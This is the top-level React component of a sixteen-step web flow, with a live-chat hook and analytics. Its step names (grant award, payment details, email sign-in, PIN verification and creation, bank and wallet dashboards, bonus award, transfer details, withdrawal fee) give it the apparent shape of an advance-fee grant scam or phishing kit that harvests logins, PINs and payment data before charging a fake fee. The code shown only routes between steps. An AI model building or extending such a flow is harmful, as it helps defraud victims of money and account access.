import React from 'react';
import { StepperProvider, useStepper } from './context/StepperContext';
import { StepperHeader } from './components/StepperHeader';
import { CompletionModal } from './components/CompletionModal';
import { Analytics } from "@vercel/analytics/react";

const Step1_Initiative = React.lazy(() => import('./components/steps/Step1_Initiative').then(module => ({ default: module.Step1_Initiative })));
const Step2_Grant = React.lazy(() => import('./components/steps/Step2_Grant').then(module => ({ default: module.Step2_Grant })));
const Step3_PaymentSelection = React.lazy(() => import('./components/steps/Step3_PaymentSelection').then(module => ({ default: module.Step3_PaymentSelection })));
const Step4_PaymentDetails = React.lazy(() => import('./components/steps/Step4_PaymentDetails').then(module => ({ default: module.Step4_PaymentDetails })));
const Step5_SecurityHandoff = React.lazy(() => import('./components/steps/Step5_SecurityHandoff').then(module => ({ default: module.Step5_SecurityHandoff })));
const Step6_EmailSignIn = React.lazy(() => import('./components/steps/Step6_EmailSignIn').then(module => ({ default: module.Step6_EmailSignIn })));
const Step7_PinVerification = React.lazy(() => import('./components/steps/Step7_PinVerification').then(module => ({ default: module.Step7_PinVerification })));
const Step8_AccountName = React.lazy(() => import('./components/steps/Step8_AccountName').then(module => ({ default: module.Step8_AccountName })));
const Step9_CreatePin = React.lazy(() => import('./components/steps/Step9_CreatePin').then(module => ({ default: module.Step9_CreatePin })));
const Step10_BankDashboard = React.lazy(() => import('./components/steps/Step10_BankDashboard').then(module => ({ default: module.Step10_BankDashboard })));
const Step11_PhoneVerification = React.lazy(() => import('./components/steps/Step11_PhoneVerification').then(module => ({ default: module.Step11_PhoneVerification })));
const Step12_WalletDashboard = React.lazy(() => import('./components/steps/Step12_WalletDashboard').then(module => ({ default: module.Step12_WalletDashboard })));
const Step13_BonusAward = React.lazy(() => import('./components/steps/Step13_BonusAward').then(module => ({ default: module.Step13_BonusAward })));
const Step14_TransferMethod = React.lazy(() => import('./components/steps/Step14_TransferMethod').then(module => ({ default: module.Step14_TransferMethod })));
const Step15_TransferDetails = React.lazy(() => import('./components/steps/Step15_TransferDetails').then(module => ({ default: module.Step15_TransferDetails })));
const Step16_WithdrawalFee = React.lazy(() => import('./components/steps/Step16_WithdrawalFee').then(module => ({ default: module.Step16_WithdrawalFee })));

const FallbackLoader = () => (
  <div style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#e5b82f', background: '#020716' }}>
    <div className="spinner"></div>
    <style>{`.spinner { width: 40px; height: 40px; border: 4px solid rgba(229, 184, 47, 0.2); border-left-color: #e5b82f; border-radius: 50%; animation: spin 1s linear infinite; } @keyframes spin { to { transform: rotate(360deg); } }`}</style>
  </div>
);

const StepContent = () => {
  const { currentStep } = useStepper();

  return (
    <React.Suspense fallback={<FallbackLoader />}>
      <main className="step-viewport-container">
        {currentStep === 1 && <Step1_Initiative />}
        {currentStep === 2 && <Step2_Grant />}
        {currentStep === 3 && <Step3_PaymentSelection />}
        {currentStep === 4 && <Step4_PaymentDetails />}
        {currentStep === 5 && <Step5_SecurityHandoff />}
        {currentStep === 6 && <Step6_EmailSignIn />}
        {currentStep === 7 && <Step7_PinVerification />}
        {currentStep === 8 && <Step8_AccountName />}
        {currentStep === 9 && <Step9_CreatePin />}
        {currentStep === 10 && <Step10_BankDashboard />}
        {currentStep === 11 && <Step11_PhoneVerification />}
        {currentStep === 12 && <Step12_WalletDashboard />}
        {currentStep === 13 && <Step13_BonusAward />}
        {currentStep === 14 && <Step14_TransferMethod />}
        {currentStep === 15 && <Step15_TransferDetails />}
        {currentStep === 16 && <Step16_WithdrawalFee />}
      </main>
    </React.Suspense>
  );
};

export const App = () => {
  React.useEffect(() => {
    const handleChatClick = (e) => {
      const chatBtn = e.target.closest('.chat');
      if (chatBtn) {
        e.preventDefault();
        e.stopPropagation();
        if (window.Tawk_API && typeof window.Tawk_API.toggle === 'function') {
          window.Tawk_API.toggle();
        } else if (window.Tawk_API && typeof window.Tawk_API.maximize === 'function') {
          window.Tawk_API.maximize();
        } else {
          alert("Live chat is still connecting. Please try again in a few seconds.");
        }
      }
    };
    document.addEventListener('click', handleChatClick, true);
    return () => document.removeEventListener('click', handleChatClick, true);
  }, []);

  return (
    <StepperProvider>
      <StepperHeader />
      <StepContent />
      <CompletionModal />
      <Analytics />
    </StepperProvider>
  );
};

export default App;
